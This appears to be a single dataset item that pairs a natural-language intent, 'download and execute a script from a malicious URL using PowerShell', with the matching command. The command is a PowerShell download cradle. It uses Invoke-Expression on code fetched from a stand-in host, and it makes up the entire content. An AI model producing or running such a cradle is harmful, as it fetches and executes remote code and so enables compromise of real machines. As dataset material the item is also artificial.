# Natural language intent:
# Download and execute a script from a malicious URL using PowerShell.

powershell.exe -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.url/evilCode.ps1')"
